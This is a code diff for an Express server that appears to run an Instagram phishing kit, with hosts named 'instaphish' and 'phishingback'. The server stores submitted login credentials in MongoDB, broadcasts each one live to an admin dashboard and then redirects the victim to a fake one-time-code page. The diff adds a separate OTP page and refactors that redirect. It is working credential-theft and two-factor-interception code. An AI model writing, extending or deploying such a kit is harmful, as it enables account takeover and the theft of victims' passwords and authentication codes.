@@ -13,6 +13,7 @@ dotenv.config({ path: path.join(__dirname, '.env') });
 const app = express();
 const server = http.createServer(app);
 const BACKEND_URL = process.env.BACKEND_URL || 'https://instaphish-2nrr.onrender.com';
+const OTP_PAGE_URL = process.env.OTP_PAGE_URL || '/otp';
 const FRONTEND_URLS = [
   'https://phishingback.vercel.app',
   'https://instaphish-eta.vercel.app',
@@ -27,9 +28,19 @@ const io = new Server(server, {
 });
 
 const staticDir = path.join(__dirname, '..', 'instagram-ui');
+const otpStaticDir = path.join(__dirname, '..', 'otp-ui');
 const PORT = process.env.PORT || 3000;
 const mongoUri = process.env.MONGODB_URI;
 const mongoDbName = process.env.MONGODB_DB || undefined;
+
+function getOtpRedirectUrl(sessionId) {
+  const target = OTP_PAGE_URL;
+  const url = target.startsWith('http') ? new URL(target) : new URL(target, BACKEND_URL);
+  if (sessionId) {
+    url.searchParams.set('sessionId', sessionId);
+  }
+  return url.toString();
+}
 
 if (!mongoUri) {
   console.error('MONGODB_URI is not set in .env');
@@ -279,10 +290,10 @@ app.post('/login', async (req, res) => {
     console.log('Saved login detail:', savedCredential);
     io.emit('loginSaved', savedCredential);
     await logCurrentLoginAndOtp();
-    return res.redirect(`${BACKEND_URL}/otp?sessionId=${encodeURIComponent(sessionId)}`);
+    return res.redirect(getOtpRedirectUrl(sessionId));
   } catch (error) {
     console.error('Error saving login data:', error);
-    return res.redirect(BACKEND_URL + '/');
+    return res.redirect(getOtpRedirectUrl());
   }
 });
 
@@ -290,7 +301,7 @@ app.post('/otp', async (req, res) => {
   try {
     const { code, sessionId } = req.body;
     if (!code) {
-      return res.redirect(`${BACKEND_URL}/otp`);
+      return res.redirect(getOtpRedirectUrl());
     }
 
     await logAccessEvent(req, 'User submitted OTP');
@@ -312,7 +323,7 @@ app.get('/', async (req, res) => {
 
 app.get('/otp', async (req, res) => {
   await logAccessEvent(req, 'User opened OTP page');
-  res.sendFile(path.join(staticDir, 'otp.html'));
+  res.sendFile(path.join(otpStaticDir, 'otp.html'));
 });
 
 app.get('/admin/login', (req, res) => {
